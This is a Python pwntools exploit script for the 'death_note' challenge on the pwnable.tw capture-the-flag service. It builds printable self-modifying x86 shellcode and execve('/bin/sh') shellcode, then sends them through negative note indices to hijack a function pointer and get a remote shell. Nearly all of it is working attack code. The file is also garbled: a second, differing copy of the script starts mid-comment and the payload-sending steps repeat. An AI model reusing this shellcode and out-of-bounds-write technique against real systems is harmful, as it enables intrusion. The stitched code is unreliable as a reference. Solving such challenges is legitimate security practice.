from pwn import *

context.arch = 'i386'
exe = './death_note'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
context.log_level = 'DEBUG'
# p = start()
p = remote("chall.pwnable.tw",10201)
g = asm('''
and edx, dword ptr [ecx+0x21]
push edx
and ebx, dword ptr [ecx+0x21]
push 0x28252028
pop eax
xor dword ptr [ecx+0x20],eax
push 0x20202040
pop eax
sub word ptr [ecx+0x21], ax
push 0x40
pop eax
sub word ptr [ecx+0x21], ax
sub byte ptr [ecx+0x23], al
dec eax
sub byte ptr [ecx+0x22], al
push 0x20
pop eax
sub dword ptr [ecx+0x20], eax
xor edx, dword ptr[ecx+0x20]
xor ebx , dword ptr [edx+0x20]
push 0x40402020
pop eax
xor dword ptr [ebx+0x51], eax
push 0x20
pop eax
dec eax
sub byte ptr [ebx+0x52], al
push 0x5d
pop ax
sub word ptr [ebx+0x51], ax
pop eax
''',vma=1)

h = asm('''
xor eax, eax
mov al, 0xb
push 0x2f62696e
push 0x2f73680a
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
''')
l = []
for i in g:
    l.append(hex(i))
    if(i>127):
        print("-",(((0xff-i) & 0x7f )+1))
    else:
        print(i)

print(l)
print(g)
print(len(g))
print(len(h))
h = h.ljust(0x50,b"\x00")
print(h)
# sending the fake strlen fnfrom pwn import *

context.arch = 'i386'
exe = './death_note'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
b * is_printable
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
context.log_level = 'DEBUG'
# p = start()
p = remote("chall.pwnable.tw",10201)
g = asm('''
and edx, dword ptr [ecx+0x21]
push edx
and ebx, dword ptr [ecx+0x21]
push 0x28252028
pop eax
xor dword ptr [ecx+0x20],eax
push 0x20202040
pop eax
sub word ptr [ecx+0x21], ax
push 0x40
pop eax
sub word ptr [ecx+0x21], ax
push 0x20
pop eax
sub dword ptr [ecx+0x23], eax
sub dword ptr [ecx+0x20], eax
xor edx, dword ptr[ecx+0x20]
xor ebx , dword ptr [edx+0x20]
push 0x40402020
pop eax
xor dword ptr [ebx+0x48], eax
push 0x20
pop eax
dec eax
sub byte ptr [ebx+0x49], al
push 0x5d
pop eax
sub word ptr [ebx+0x48], ax
pop eax
''',vma=1)

h = asm('''
xor eax, eax
push eax
mov al, 0xb
push 0x0a68732f
xor ecx, ecx
mov byte ptr [esp+0x3], cl
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
''')
l = []
for i in g:
    l.append(hex(i))
    if(i>127):
        print("-",(((0xff-i) & 0x7f )+1))
    else:
        print(i)

h = h.ljust(0x50,b"\x00")
print(h)
# sending the fake strlen fn
p.recvuntil(b"Your choice :")
p.sendline(b"1")
p.recvuntil(b"Index :")
p.sendline(b"-14")
p.recvuntil(b"Name :")
p.send(g+b"\x00")
# p.interactive()
# using the fn and taking in input
p.recvuntil(b"Your choice :")
p.sendline(b"1")
p.recvuntil(b"Index :")
p.sendline(b"-16")
p.recvuntil(b"Name :")
p.send(h)
p.interactive()
p.recvuntil(b"Your choice :")
p.sendline(b"1")
p.recvuntil(b"Index :")
p.sendline(b"-14")
p.recvuntil(b"Name :")
p.send(g+b"\x00")
# p.interactive()
# using the fn and taking in input
p.recvuntil(b"Your choice :")
p.sendline(b"1")
p.recvuntil(b"Index :")
p.sendline(b"-16")
p.recvuntil(b"Name :")
p.send(h)
p.interactive()

